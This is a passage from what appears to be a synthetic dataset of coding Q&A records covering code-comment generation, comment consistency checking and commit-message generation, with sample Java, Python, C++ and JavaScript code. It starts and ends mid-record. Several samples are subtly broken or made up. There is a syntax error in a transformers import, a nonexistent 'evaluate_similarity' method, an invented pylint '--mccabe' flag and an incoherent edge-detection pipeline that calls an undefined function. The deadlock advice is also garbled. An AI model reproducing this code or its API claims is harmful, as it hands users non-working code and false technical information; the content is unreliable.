public Worker(SharedResource resource) {\n        this.resource = resource;\n    }\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 1000; i++) {\n            resource.addData(i, UUID.randomUUID().toString());\n            // Potentially add random pauses to simulate different execution times\n            try {\n                Thread.sleep((int) (Math.random() * 100));\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        SharedResource shared = new SharedResource();\n        ExecutorService executor = Executors.newFixedThreadPool(5);\n\n        for (int i = 0; i < 5; i++) {\n            executor.execute(new Worker(shared));\n        }\n\n        executor.shutdown();\n        while (!executor.isTerminated()) {\n        }\n\n        System.out.println(\"All threads finished\");\n    }\n}\n```\n\nComment:\n\n```\nThis Java program demonstrates a multi-threaded scenario where several worker threads read and write to a shared resource using the `SharedResource` class. The class uses a `ConcurrentHashMap` for thread-safe data storage and a `Semaphore` with a single permit to ensure mutual exclusion while accessing the resource.\n\nRace Conditions:\nPossible race conditions occur when multiple threads attempt to modify the data simultaneously. By using a `Semaphore`, we prevent these conditions as only one thread can access the resource at a time.\n\nDeadlock Scenarios:\nDeadlocks can occur if the threads hold the semaphore while waiting for another resource. In this simplified example, this is not the case, but if additional locks or synchronization mechanisms were introduced, care must be taken to avoid deadlocks by following the 'Holding a lock, wait for a resource' rule.\n\nTrade-offs:\nThe use of a semaphore and `ConcurrentHashMap` ensures correct behavior in a multi-threaded environment but introduces some performance overhead due to the synchronization. The fixed thread pool limits the number of concurrent threads and prevents excessive resource consumption, but it can lead to bottlenecks if the number of threads is not optimized for the workload. Adjusting the pool size and considering other synchronization strategies can help balance performance and correctness.\n\n```"}, {"L2_TASK": "Comment generation", "L3_TASK": "Summarize logical blocks with comments", "Complexity_Level": "medium", "Response": "The given JSON doesn't have a direct category or subcategory for \"Comment generation\" or \"Summarize logical blocks with comments\". However, this topic falls under the broader category of \"Programming Language Concepts\" and the usage of comments to improve code readability and maintainability. Here, we can create a problem related to summarizing logical blocks in code using comments.\n\n**Question 1:**\n\n**Problem:**\nYou are given a program that performs a complex calculation involving multiple steps. The code lacks proper comments to explain the logical blocks and their purpose. Modify the code to summarize logical blocks with comments to enhance readability.\n\n**Solution:**\nHere's an example in Python before adding comments:\n\n```python\ndef complex_calculation(x, y, z):\n    a = x * y\n    b = (x + y) / z\n    c = a ** b\n    d = c % 2\n    e = a + b + c + d\n    return e\n\nresult = complex_calculation(5, 3, 2)\nprint(result)\n```\n\nAfter adding comments to summarize logical blocks:\n\n```python\ndef complex_calculation(x, y, z):\n    # Step 1: Multiply x and y\n    product_xy = x * y\n\n    # Step 2: Calculate (x + y) divided by z\n    average_div_z = (x + y) / z\n\n    # Step 3: Raise the product to the power of the average\n    power_result = product_xy ** average_div_z\n\n    # Step 4: Check if the power result is odd (by finding the remainder after dividing by 2)\n    is_odd = power_result % 2\n\n    # Step 5: Sum all calculated values to get the final result\n    final_result = product_xy + average_div_z + power_result + is_odd\n    return final_result\n\nresult = complex_calculation(5, 3, 2)\nprint(result)\n```\n\n**Question 2:**\n\n**Problem:**\nA JavaScript function processes an array of objects, filtering and transforming the data. Add comments to describe each logical block for better understanding.\n\n**Solution:**\n\nOriginal JavaScript code:\n\n```javascript\nfunction processData(data) {\n    const filteredData = data.filter(item => item.age > 18);\n    const transformedData = filteredData.map(item => ({ id: item.id, age: item.age, name: item.name.toUpperCase() }));\n    return transformedData;\n}\n```\n\nAfter adding comments to summarize logical blocks:\n\n```javascript\nfunction processData(data) {\n    // Step 1: Filter out objects where age is less than or equal to 18\n    const filteredData = data.filter(item => item.age > 18);\n\n    // Step 2: Transform filtered data by creating new objects with 'id', 'age', and uppercase 'name'\n    const transformedData = filteredData.map(item => ({\n        id: item.id, // Preserve the original ID\n        age: item.age, // Keep the age unchanged\n        name: item.name.toUpperCase() // Convert the name to uppercase\n    }));\n\n    // Step 3: Return the transformed data\n    return transformedData;\n}\n```\n\nThese examples demonstrate how to effectively summarize logical blocks of code with comments, improving code readability."}, {"L2_TASK": "Comment generation", "L3_TASK": "Summarize logical blocks with comments", "Complexity_Level": "extremely difficult", "Response": "Area: Comment Generation\nSub Area: Summarize logical blocks with comments\n\nQuestion 1:\nGiven a complex and highly optimized image processing algorithm implemented in C++, create a code snippet that demonstrates the summarization of logical blocks using comments. The algorithm should perform real-time edge detection using the Canny method, with additional optimizations for speed and memory efficiency.\n\nSolution (Concept: Image Processing, Comment Generation):\n```cpp\n// Canny Edge Detection with optimizations\n#include <opencv2/opencv.hpp>\n#include <opencv2/imgproc.hpp>\n#include <opencv2/highgui.hpp>\n\n// Gaussian blur kernel size\n#define GAUSSIAN_KERNEL_SIZE 5\n// Non-maximum suppression threshold\n#define NON_MAX_SUPPRESSION_THRESH 0.1\n// Double threshold values for edge tracking\n#define THRESH_1 100\n#define THRESH_2 200\n\n// Custom Canny edge detector with optimized steps\nvoid optimizedCannyEdgeDetection(const cv::Mat& input, cv::Mat& output) {\n    // Step 1: Gaussian blur to reduce noise\n    cv::Mat blurred;\n    cv::GaussianBlur(input, blurred, cv::Size(GAUSSIAN_KERNEL_SIZE, GAUSSIAN_KERNEL_SIZE), 0);\n\n    // Step 2: Calculate gradient magnitude and direction\n    cv::Mat sobelX, sobelY;\n    cv::Sobel(blurred, sobelX, CV_64F, 1, 0, 3, 1, 0, cv::BORDER_DEFAULT);\n    cv::Sobel(blurred, sobelY, CV_64F, 0, 1, 3, 1, 0, cv::BORDER_DEFAULT);\n    cv::Mat gradientMag, gradientAngle;\n    cv::cartToPolar(sobelX, sobelY, gradientMag, gradientAngle, true);\n\n    // Step 3: Non-maximum suppression\n    cv::Mat nonMaxSuppressed;\n    nonMaxSuppression(gradientMag, gradientAngle, nonMaxSuppressed, NON_MAX_SUPPRESSION_THRESH);\n\n    // Step 4: Double threshold for edge tracking\n    cv::Mat thresholded1, thresholded2;\n    cv::threshold(nonMaxSuppressed, thresholded1, THRESH_1, 255, cv::THRESH_BINARY);\n    cv::threshold(nonMaxSuppressed, thresholded2, THRESH_2, 255, cv::THRESH_BINARY_INV | cv::THRESH_OTSU);\n\n    // Step 5: Edge connectivity and hysteresis\n    cv::Mat edges;\n    cv::bitwise_and(thresholded1, thresholded2, edges);\n    cv::Canny(edges, edges, THRESH_1, THRESH_2, 8);\n\n    // Copy result to output matrix\n    output = edges.clone();\n}\n\nint main() {\n    cv::Mat inputImage = cv::imread(\"input.jpg\", cv::IMREAD_GRAYSCALE);\n    if (inputImage.empty()) {\n        std::cout << \"Error: Could not load image\" << std::endl;\n        return -1;\n    }\n\n    cv::Mat outputImage;\n    optimizedCannyEdgeDetection(inputImage, outputImage);\n\n    cv::imshow(\"Original Image\", inputImage);\n    cv::imshow(\"Edges\", outputImage);\n    cv::waitKey(0);\n    cv::destroyAllWindows();\n\n    return 0;\n}\n```\nQuestion 2:\nDevelop a Python script for a machine learning project that implements a custom deep learning model for text classification with multiple"}, {"L2_TASK": "Comment generation", "L3_TASK": "Code annotation for review", "Complexity_Level": "medium", "Response": "\"Comment generation\" is not explicitly mentioned in the provided JSON, but it can be related to the \"Programming Language Concepts\" category, specifically in the context of code annotation and review. Here, we can create a problem involving writing a function and providing meaningful comments for code review.\n\nQuestion 1:\nGiven a Python function that performs a complex calculation, improve the code by adding descriptive comments to aid in code review and maintainability.\n\n```python\ndef complex_calculation(x, y, z):\n    a = x ** y  # Compute x to the power of y\n    b = z / (x + y)  # Divide z by the sum of x and y\n    c = a * b  # Multiply result of a and b\n    final_result = round(c, 2)  # Round to two decimal places and store as final result\n    return final_result\n```\n\nSolution:\n```python\ndef complex_calculation(x, y, z):\n    \"\"\"\n    This function performs a complex calculation involving exponentiation, division, and rounding.\n    It takes three input parameters: x, y, and z, and returns a final result rounded to two decimal places.\n\n    :param x: A numeric value for the base\n    :param y: A numeric value for the exponent\n    :param z: A numeric value for division\n    :return: The computed result, rounded to two decimal places\n    \"\"\"\n\n    # Step 1: Compute x to the power of y\n    a = x ** y\n\n    # Step 2: Divide z by the sum of x and y, ensuring no division by zero\n    if x + y == 0:\n        raise ValueError(\"Invalid input: Division by zero is not allowed\")\n    b = z / (x + y)\n\n    # Step 3: Multiply the results of step 1 and step 2\n    c = a * b\n\n    # Step 4: Round the result to two decimal places and return\n    final_result = round(c, 2)\n    return final_result\n```\n\nQuestion 2:\nIn a JavaScript application, annotate the following code to explain its purpose and improve readability for a code review.\n\n```javascript\nfunction fetchUserData(userId) {\n    const url = `https://api.example.com/users/${userId}`;\n    fetch(url)\n        .then(response => response.json())\n        .then(data => displayUserDetails(data))\n        .catch(error => handleApiError(error));\n}\n```\n\nSolution:\n```javascript\n/**\n * Fetches user data from a remote API based on the provided user ID and\n * displays the details on the UI. Handles errors that may occur during the process.\n * \n * @param {number} userId - The unique identifier of the user to fetch data for\n */\nfunction fetchUserData(userId) {\n    // Construct the API endpoint URL with the given user ID\n    const url = `https://api.example.com/users/${userId}`;\n\n    // Perform the asynchronous fetch request\n    fetch(url)\n        // Parse the response to JSON format\n        .then(response => {\n            if (!response.ok) {\n                throw new Error(`API error: ${response.status}`);\n            }\n            return response.json();\n        })\n        // Process the fetched data and display user details on the UI\n        .then(data => {\n            displayUserDetails(data);\n        })\n        // Handle any errors that occur during the fetch or JSON parsing\n        .catch(error => {\n            handleApiError(error);\n        });\n}\n```"}, {"L2_TASK": "Comment generation", "L3_TASK": "Code annotation for review", "Complexity_Level": "extremely difficult", "Response": "Area: \"Code annotation for review\"\nSub Area: \"Comment generation\"\n\nProblem: Develop a highly advanced and intelligent code annotation system that automatically generates meaningful, context-aware comments for complex code snippets, improving their readability and maintainability. The system should be able to handle various programming languages and effectively identify, understand, and explain complex patterns, algorithms, and data structures.\n\nSolution:\n\nConcept: Natural Language Processing (NLP), Code Analysis, Machine Learning\n\nTo solve this problem, we can create a deep learning-based system using Python, leveraging NLP libraries like `spaCy`, `NLTK`, and `transformers`. The system will involve the following steps:\n\n1. Preprocessing: Tokenize, parse, and extract features from the code.\n2. Training: Train a model on a large dataset of code snippets with manually annotated comments.\n3. Comment generation: Generate context-aware comments using the trained model.\n\nExample Python code (high-level pseudocode):\n\n```python\nimport spacy\nimport torch\nfrom transformers import AutoTokenizer, AutoModelForSeq2SeqLM\n\n# Load pre-trained NLP model and code language model\nnlp = spacy.load('en_core_web_sm')  # Load English NLP model\ntokenizer = AutoTokenizer.from_pretrained(\"microsoft/codebert-base\")\ncode_model = AutoModelForSeq2SeqLM.from_pretrained(\"microsoft/codebert-base\")\n\ndef preprocess_code(code, language):\n    # Tokenize and parse the code\n    parsed_code = nlp(code)\n    \n    # Extract relevant features, e.g., function names, variable names, data structures, and control flow\n    features = extract_code_features(parsed_code, language)\n    \n    # Encode the code as a sequence of tokens\n    input_ids = tokenizer.encode(code, return_tensors='pt')\n    \n    return input_ids, features\n\ndef generate_comments(input_ids, features, model):\n    # Add features as additional input to the model (if needed)\n    \n    # Generate comment tokens\n    generated_tokens = model.generate(input_ids, max_length=200, num_beams=4, early_stopping=True)\n    \n    # Decode the tokens back into a string\n    comment = tokenizer.decode(generated_tokens[0], skip_special_tokens=True)\n    \n    return comment\n\ndef main():\n    code_snippet = \"\"\"\n        def merge_sorted_lists(list1, list2):\n            merged_list = []\n            i, j = 0, 0\n\n            while i < len(list1) and j < len(list2):\n                if list1[i] < list2[j]:\n                    merged_list.append(list1[i])\n                    i += 1\n                else:\n                    merged_list.append(list2[j])\n                    j += 1\n\n            if i < len(list1):\n                merged_list.extend(list1[i:])\n            if j < len(list2):\n                merged_list.extend(list2[j:])\n\n            return merged_list\n    \"\"\"\n\n    input_ids, features = preprocess_code(code_snippet, \"Python\")\n    comment = generate_comments(input_ids, features, code_model)\n\n    print(f\"Generated Comment: {comment}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nNote: This is a simplified and high-level pseudocode representation, and a complete solution would involve more complex components, including dataset creation, extensive preprocessing, model training, and fine-tuning. The actual implementation would require significant computational resources and time."}, {"L2_TASK": "Comment generation", "L3_TASK": "Extract and comment critical sections", "Complexity_Level": "medium", "Response": "\"Comment generation\" is not a direct concept mentioned in the provided JSON. However, it can be related to the \"Programming Language Concepts\" - specifically \"Documentation and Comments\" within a language's syntax. In this case, we'll create a problem related to extracting and commenting on critical sections of code in Python.\n\nProblem: Create a Python script that uses a Python linter (such as `pylint`) to automatically identify complex functions or long lines and generate comments summarizing the function's purpose or suggesting line splitting.\n\nSolution:\n\n```python\nimport ast\nimport re\nimport subprocess\n\n\ndef get_complex_functions(file_path):\n    \"\"\"\n    Identify complex functions (long lines or high McCabe complexity) in a Python file.\n    :param file_path: Path to the Python file\n    :return: List of tuples (function_name, line_number, complexity)\n    \"\"\"\n    with open(file_path, \"r\") as file:\n        code = file.read()\n\n    node_list = ast.parse(code)\n    complex_functions = []\n\n    for node in node_list.body:\n        if isinstance(node, ast.FunctionDef):\n            function_name = node.name\n            line_number = node.lineno\n\n            mccabe_output = subprocess.run([\"pylint\", \"--mccabe\", \"--disable=all,other,errors\", \"-r n\", file_path],\n                                           capture_output=True, text=True)\n            complexity_match = re.search(f'{function_name}.*?(\\d+)', mccabe_output.stdout)\n\n            if complexity_match:\n                complexity = int(complexity_match.group(1))\n                if complexity > 10 or len(node.body) > 50:  # Assuming complexity > 10 and long functions as complex\n                    complex_functions.append((function_name, line_number, complexity))\n\n    return complex_functions\n\n\ndef generate_comments(file_path, complex_functions):\n    \"\"\"\n    Generate comments for complex functions in a Python file.\n    :param file_path: Path to the Python file\n    :param complex_functions: List of tuples (function_name, line_number, complexity)\n    \"\"\"\n    with open(file_path, \"r\") as file:\n        code_lines = file.readlines()\n\n    for func_name, line_number, complexity in complex_functions:\n        comment = f'# [Complex Function] Function {func_name} has a McCabe complexity of {complexity}\\n'\n        code_lines.insert(line_number - 1, comment)\n\n    with open(\"commented_file.py\", \"w\") as output_file:\n        output_file.writelines(code_lines)\n\n\ndef main():\n    file_path = \"example.py\"\n    complex_functions = get_complex_functions(file_path)\n    generate_comments(file_path, complex_functions)\n    print(f\"Generated comments for {len(complex_functions)} complex functions.\")\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\nConcept: \"Documentation and Comments\" (Python)\n\nThis solution identifies complex functions by parsing the Python source code, using `pylint` to calculate McCabe complexity, and then generates comments for these functions to highlight their complexity. The complexity threshold and line length are somewhat arbitrary, so they can be adjusted as needed."}, {"L2_TASK": "Comment generation", "L3_TASK": "Extract and comment critical sections", "Complexity_Level": "extremely difficult", "Response": "Area: \"Comment generation\" Sub Area: \"Extract and Comment Critical Sections\"\n\nQuestion 1: Develop a program that automatically identifies and comments on performance-critical sections in a C++ codebase, providing suggestions for optimization. The program should analyze code patterns, identify bottlenecks, and generate human-readable comments with possible solutions.\n\nSolution:\n```cpp\n// Concept: Performance Analysis and Optimization\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <unordered_map>\n#include <regex>\n\n// Function to extract line numbers and functions from code\nstd::unordered_map<int, std::string> extractCodeInfo(const std::string& code) {\n    // Code to parse and extract line numbers and functions\n}\n\n// Function to identify performance-critical patterns\nbool isPerformanceCritical(const std::string& line) {\n    // Code to identify patterns like nested loops, excessive memory allocation, etc.\n}\n\n// Function to suggest optimizations\nstd::string generateOptimizationComment(const std::string& line) {\n    // Code to generate optimization suggestions based on the identified pattern\n}\n\n// Function to generate comments and insert into code\nvoid generateAndInsertComments(std::string& code) {\n    std::unordered_map<int, std::string> codeInfo = extractCodeInfo(code);\n\n    for (const auto& [lineNum, function] : codeInfo) {\n        if (isPerformanceCritical(function)) {\n            std::string comment = generateOptimizationComment(function);\n            // Code to insert comment at the appropriate line in the original code\n        }\n    }\n}\n\nint main() {\n    std::ifstream inputFile(\"source.cpp\");\n    std::string code((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());\n    inputFile.close();\n\n    generateAndInsertComments(code);\n\n    std::ofstream outputFile(\"optimized_source.cpp\");\n    outputFile << code;\n    outputFile.close();\n\n    return 0;\n}\n```\nQuestion 2: Create a Python script that extracts and comments on complex and error-prone sections of code, focusing on sections using multiple inheritance, with suggestions for alternative design patterns or refactorings.\n\nSolution:\n```python\n# Concept: Inheritance and Design Patterns\nimport re\n\ndef extract_code_info(code):\n    lines = code.split('\\n')\n    line_info = []\n    for i, line in enumerate(lines):\n        if 'class' in line:\n            line_info.append((i, line))\n    return line_info\n\ndef is_complex_inheritance(line):\n    pattern = re.compile(r\"class [a-zA-Z_][a-zA-Z0-9_]*\\s*:\\s*(\\s*[\\w.]+,\\s*)+\")\n    return pattern.match(line)\n\ndef suggest_refactoring(line):\n    if 'MultipleInheritanceClass' in line:\n        return \"Consider using composition, Adapter pattern, or a different design pattern to avoid complexity.\"\n    else:\n        return \"No specific refactoring suggestion found.\"\n\ndef generate_and_insert_comments(code):\n    code_info = extract_code_info(code)\n    for line_num, line in code_info:\n        if is_complex_inheritance(line):\n            comment = f'#{line_num} {line.strip()} // {suggest_refactoring(line)}'\n            code = code[:line_num] + comment + code[line_num:]\n\n    return code\n\nwith open('source.py', 'r') as f:\n    original_code = f.read()\n    f.close()\n\noptimized_code = generate_and_insert_comments(original_code)\n\nwith open('optimized_source.py', 'w') as f:\n    f.write(optimized_code)\n    f.close()\n```\nNote: These are simplified examples to demonstrate the concept. Developing an actual code analysis tool with such complexity would require a deep understanding of the programming language, its performance characteristics, and potentially utilizing existing static analysis libraries."}, {"L2_TASK": "Comment generation", "L3_TASK": "Tool-generated comment consistency check", "Complexity_Level": "medium", "Response": "Area: \"Comment generation\"\nSub Area: \"Tool-generated comment consistency check\"\n\nProblem: Develop a tool to assess the consistency of comments generated by an AI tool for a given codebase. The tool should check if the comments accurately describe the code they precede and ensure they remain up-to-date when code changes occur.\n\nConcept: \"Code analysis\"\n\nMedium Difficulty Question 1:\n\n**Question:**\nYou have been assigned to build a tool in Python that analyzes a codebase and detects inconsistencies between comments and the corresponding code. The tool should flag any comments that don't accurately describe the functionality of the code block they precede. Implement a function called `check_comment_consistency(file_path)` that takes a path to a Python file as input and returns a list of inconsistent comment-code pairs.\n\n**Solution:**\n```python\nimport ast\nimport re\n\ndef extract_comments_and_code(file_path):\n    with open(file_path, 'r') as file:\n        code = file.read()\n    tree = ast.parse(code)\n    comments = []\n    code_nodes = []\n\n    for node in ast.walk(tree):\n        if isinstance(node, ast.Expr) and isinstance(node.value, ast.Str):\n            comments.append((node.lineno, node.value.s))\n        elif not isinstance(node, (ast.AST, ast.alias)):\n            code_nodes.append((node.lineno, node))\n\n    return comments, code_nodes\n\ndef check_comment_consistency(file_path):\n    comments, code_nodes = extract_comments_and_code(file_path)\n    inconsistent_pairs = []\n\n    for commentlineno, comment in comments:\n        for codenodelineno, codenode in code_nodes:\n            if commentlineno == codenodelineno - 1:\n                comment_desc = re.sub(r'\\s+', ' ', comment).strip()\n                codenode_desc = describe_code(codenode)  # Assume a function to describe code\n                if comment_desc != codenode_desc:\n                    inconsistent_pairs.append((comment, codenode))\n\n    return inconsistent_pairs\n\n# Example usage\nfile_path = \"example.py\"\ninconsistent_pairs = check_comment_consistency(file_path)\nprint(inconsistent_pairs)\n```\n\nNote: The `describe_code` function is not provided in the solution as it is a placeholder for a more complex function that would analyze the code node and generate an appropriate description.\n\nMedium Difficulty Question 2:\n\n**Question:**\nExtend the previous Python tool to handle function and method comments. The tool should check if the docstrings accurately describe the function's behavior, parameters, and return values. Modify the `check_comment_consistency` function to include this functionality.\n\n**Solution:**\n```python\nimport ast\nimport re\n\ndef extract_comments_and_code(file_path):\n    # ... (same as before)\n\ndef describe_function(node):\n    func_name = node.name\n    arg_descs = [f'{arg.arg}: {arg.annotation}' for arg in node.args.args if arg.annotation]\n    return_desc = node.returns and f'returns: {node.returns.annotation}' or 'No return value'\n    return f'{func_name}({\", \".join(arg_descs)}) {return_desc}'\n\ndef check_comment_consistency(file_path):\n    comments, code_nodes = extract_comments_and_code(file_path)\n    inconsistent_pairs = []\n\n    for commentlineno, comment in comments:\n        for codenodelineno, codenode in code_nodes:\n            if isinstance(codenode, ast.FunctionDef) and commentlineno == codenodelineno - 1:\n                comment_desc = re.sub(r'\\s+', ' ', comment).strip()\n                codenode_desc = describe_function(codenode)\n                if comment_desc != codenode_desc:\n                    inconsistent_pairs.append((comment, codenode))\n\n    return inconsistent_pairs\n\n# Example usage\nfile_path = \"example.py\"\ninconsistent_pairs = check_comment_consistency(file_path)\nprint(inconsistent_pairs)\n```\nIn this solution, we added the `describe_function` function, which generates a description based on the function's docstring and parameter annotations. The `check_comment_consistency` function now specifically looks for `ast.FunctionDef` nodes and compares their docstrings with the preceding comments."}, {"L2_TASK": "Comment generation", "L3_TASK": "Tool-generated comment consistency check", "Complexity_Level": "extremely difficult", "Response": "Area: \"Comment generation\" Sub Area: \"Tool-generated comment consistency check\"\n\nQuestion 1: Develop a system that uses natural language processing (NLP) and deep learning to evaluate the consistency and accuracy of tool-generated comments in a large codebase. The system should ensure that comments accurately describe the code's functionality and are updated when the code changes.\n\nConcept: Natural Language Processing, Deep Learning, Comment Generation\n\nSolution:\nTo solve this problem, we'll create a deep learning model trained on a dataset of code snippets and corresponding comments. The model will learn to predict the likelihood of a comment accurately describing the code. A consistency check will be performed by comparing the model's prediction with the actual generated comment. The system will also monitor code changes and flag outdated comments.\n\nExample Python code using Hugging Face Transformers library:\n\n```python\nimport torch\nfrom transformers import AutoTokenizer, AutoModelForCode Generation, pipeline\n\n# Load pre-trained model and tokenizer\nmodel_name = \"huggingface/codex-small\"\ntokenizer = AutoTokenizer.from_pretrained(model_name)\nmodel = AutoModelForCodeGeneration.from_pretrained(model_name)\n\n# Function to generate comment for a code snippet\ndef generate_comment(code):\n    inputs = tokenizer.encode(f\"/* {code} */\", return_tensors=\"pt\")\n    outputs = model.generate(inputs, max_length=50, num_return_sequences=1, temperature=1.0)\n    return tokenizer.decode(outputs[0])\n\n# Function to check comment consistency\ndef consistency_check(code, comment):\n    generated_comment = generate_comment(code)\n    consistency_score = model.evaluate_similarity(comment, generated_comment)\n    return consistency_score\n\n# Example code snippet and comment\ncode_snippet = \"def calculate_total(quantity, price): return quantity * price\"\noriginal_comment = \"Calculate the sum of two numbers.\"\n\n# Check consistency\nscore = consistency_check(code_snippet, original_comment)\nif score < 0.7:  # Threshold for inconsistency\n    print(\"Comment might be inconsistent with the code.\")\nelse:\n    print(\"Comment is consistent with the code.\")\n\n# Simulate code change\nnew_code_snippet = \"def calculate_total(quantity, price, discount): return (quantity * price) * (1 - discount)\"\n\n# Update comment if necessary\nnew_score = consistency_check(new_code_snippet, original_comment)\nif new_score < 0.7:\n    print(\"Updating comment...\")\n    new_comment = generate_comment(new_code_snippet)\n    print(f\"New comment: {new_comment}\")\nelse:\n    print(\"Comment is still consistent with the updated code.\")\n```\n\nQuestion 2: Implement an automated system that refactors inconsistent comments by suggesting alternative comments that better align with the updated code. The system should utilize a combination of static analysis and contextual understanding to propose accurate and concise alternatives.\n\nConcept: Natural Language Processing, Comment Generation, Code Analysis\n\nSolution:\nTo address this, we'll create a system that combines static code analysis with a fine-tuned language model to propose alternative comments. The analysis will identify code changes, and the language model will generate new comments based on the updated code.\n\nExample Python code using PyTorch and a custom-trained language model:\n\n```python\nimport torch\nfrom torch.nn import functional as F\nfrom code_analysis import analyze_code\nfrom custom_language_model import CustomLanguageModel\n\n# Initialize custom language model\nmodel = CustomLanguageModel()\nmodel.load_state_dict(torch.load('model.pth'))\nmodel.eval()\n\n# Static code analysis function (pseudocode)\ndef analyze_changes(old_code, new_code):\n    changes = analyze_code(old_code, new_code)\n    return changes['added'], changes['removed']\n\n# Function to generate alternative comments\ndef suggest_alternative_comment(code):\n    input_ids, attention_mask = model.encode(code)\n    output = model.generate(input_ids, attention_mask, max_length=50)\n    return model.decode(output)\n\n# Example code snippets\nold_code_snippet = \"def calculate_total(quantity, price): return quantity * price\"\nnew_code_snippet = \"def calculate_total(quantity, price, discount): return (quantity * price) * (1 - discount)\"\n\n# Analyze code changes\nadded, removed = analyze_changes(old_code_snippet, new_code_snippet)\n\n# Suggest alternative comment for updated code\nalternative_comment = suggest_alternative_comment(new_code_snippet)\nprint(f\"Suggested alternative comment: {alternative_comment}\")\n```\nIn reality, implementing this system would require significant work in developing the custom language model, static code analysis tool, and integrating them effectively."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Create a descriptive and useful commit text for this commit", "Complexity_Level": "medium", "Response": "As a senior expert in software development, I understand that creating descriptive and useful commit texts is crucial for maintaining clean version control history and enabling effective collaboration. Here are two medium complexity problems and their solutions in the context of writing commit messages:\n\nQuestion 1:\nProblem: You have made several changes to a codebase, including bug fixes, new features, and refactoring. You need to generate a commit message that accurately describes these changes without being overly verbose.\n\nSolution Concept: \"Commit Message Guidelines\"\n\n```python\ndef generate_commit_message(file_changes, bug_fixes, new_features, refactoring):\n    commit_message = f\" chore: {', '.join(file_changes)}\\n\"\n    if bug_fixes:\n        commit_message += f\" - Fix {', '.join(bug_fixes)}\\n\"\n    if new_features:\n        commit_message += f\" - Add {', '.join(new_features)}\\n\"\n    if refactoring:\n        commit_message += f\" - Refactor {', '.join(refactoring)}\\n\"\n    \n    # Ensure commit message follows conventional commits format\n    if bug_fixes or refactoring:\n        commit_message = \"fix: \" + commit_message[5:]\n    elif new_features:\n        commit_message = \"feat: \" + commit_message[5:]\n    else:\n        commit_message = \"chore: \" + commit_message[5:]\n    \n    return commit_message.strip()\n\nfile_changes = [\"updated_user_interface.py\", \"authentication.py\"]\nbug_fixes = [\"login_bug\", \"session_management\"]\nnew_features = [\"two_factor_auth\"]\nrefactoring = [\"user_management\"]\n\ncommit_message = generate_commit_message(file_changes, bug_fixes, new_features, refactoring)\nprint(commit_message)\n```\n\nExample Output:\n```\nfix: updated_user_interface.py, authentication.py\n- Fix login_bug\n- Fix session_management\n- Add two_factor_auth\n- Refactor user_management\n```\n\nQuestion 2:\nProblem: You've made changes to a library's public API and need to create a commit message that not only describes the changes but also provides migration guidance for users.\n\nSolution Concept: \"Public API Update Commit\"\n\n```python\ndef generate_api_update_commit_message(changed_functions, added_functions, deprecated_functions, migration_guide):\n    commit_message = f\" feat(api): Update public API\\n\"\n    commit_message += f\" - Changed: {', '.join(changed_functions)}\\n\"\n    commit_message += f\" - Added: {', '.join(added_functions)}\\n\"\n    commit_message += f\" - Deprecated: {', '.join(deprecated_functions)}\\n\"\n    commit_message += f\"\\nMigration guide:\\n{migration_guide}\\n\"\n\n    return commit_message.strip()\n\nchanged_functions = [\"function1\", \"function2\"]\nadded_functions = [\"function3\", \"function4\"]\ndeprecated_functions = [\"function5\"]\nmigration_guide = \"1. Replace usage of 'function5' with 'function6'\\n2. Update arguments for 'function1' and 'function2' as per new specifications.\"\n\ncommit_message = generate_api_update_commit_message(changed_functions, added_functions, deprecated_functions, migration_guide)\nprint(commit_message)\n```\n\nExample Output:\n```\nfeat(api): Update public API\n - Changed: function1, function2\n - Added: function3, function4\n - Deprecated: function5\n\nMigration guide:\n1. Replace usage of 'function5' with 'function6'\n2. Update arguments for 'function1' and 'function2' as per new specifications.\n```"}, {"L2_TASK": "Commit text generation", "L3_TASK": "Create a descriptive and useful commit text for this commit", "Complexity_Level": "extremely difficult", "Response": "Domain: Development, Sub Area: Web Development (specifically Git and version control)\n\nProblem 1: Generate a commit message that accurately summarizes a complex refactoring effort involving multiple files, while also providing enough detail for future developers to understand the changes.\n\nSolution:\n```markdown\nConcept: Git Commit Message\n\nCommit Message:\n\"Refactor application architecture: Introduce Domain-Driven Design (DDD) principles and improve code modularity\n\n- Migrated existing monolithic codebase into bounded contexts for improved scalability and maintainability.\n- Implemented repository pattern for better data access abstraction, separating concerns between services and persistence.\n- Introduced event-driven architecture using RabbitMQ for inter-service communication and loose coupling.\n- Reorganized and standardized file structure according to DDD guidelines.\n- Updated documentation to reflect new architecture and API changes.\n\nImpacted Files:\n- app/controllers/*.js\n- app/services/*.js\n- app/repositories/*.js\n- app/events/*.js\n- app/config/*.js\n- README.md\"\n```\nExample Code (in a script for automating commit generation):\n```javascript\nconst fs = require('fs');\nconst path = require('path');\nconst glob = require('glob');\nconst { exec } = require('child_process');\n\nasync function generateCommitMessage(boundedContexts, repositoryPattern, eventDriven, affectedFiles) {\n  const message = `\nRefactor application architecture: ${boundedContexts}, ${repositoryPattern}, ${eventDriven}\n\n- ${boundedContexts} to improve scalability and maintainability.\n- ${repositoryPattern} for better data access abstraction.\n- ${eventDriven} using RabbitMQ for loose coupling.\n- Reorganized file structure and updated documentation.\n\nImpacted Files:\n${affectedFiles.join('\\n')}`;\n\n  const commitCommand = `git commit -am \"${message}\"`;\n  exec(commitCommand, (error) => {\n    if (error) {\n      console.error(`Error committing: ${error}`);\n    } else {\n      console.log('Commit message generated and applied');\n    }\n  });\n}\n\n// Example usage\nconst affectedFiles = glob.sync('app/**/*.js');\ngenerateCommitMessage('Introduce Domain-Driven Design (DDD) principles', 'Implement repository pattern', 'Introduce event-driven architecture', affectedFiles);\n```\nProblem 2: Create a commit message for a merge commit resolving a long-running feature branch with several conflicting changes across multiple components and libraries.\n\nSolution:\n```markdown\nConcept: Git Commit Message\n\nCommit Message:\n\"Merge FeatureBranchXYZ: Implement responsive UI and integrate new authentication flow with conflict resolutions\n\n- Added support for responsive design across all major breakpoints, ensuring consistent experience on desktop and mobile.\n- Implemented a new OAuth2-based authentication flow using Google and Facebook providers.\n- Resolved merge conflicts in:\n  - components/Header.js\n  - services/auth.js\n  - styles/global.css\n  - routes/login.js\n\nIMPORTANT: Manual review and testing required due to extensive changes and conflicts.\n\nConflicts:\n- components/Header.js: adjusted markup and styles for new mobile navigation.\n- services/auth.js: merged OAuth configurations and handlers.\n- styles/global.css: resolved style conflicts for responsive classes.\n- routes/login.js: 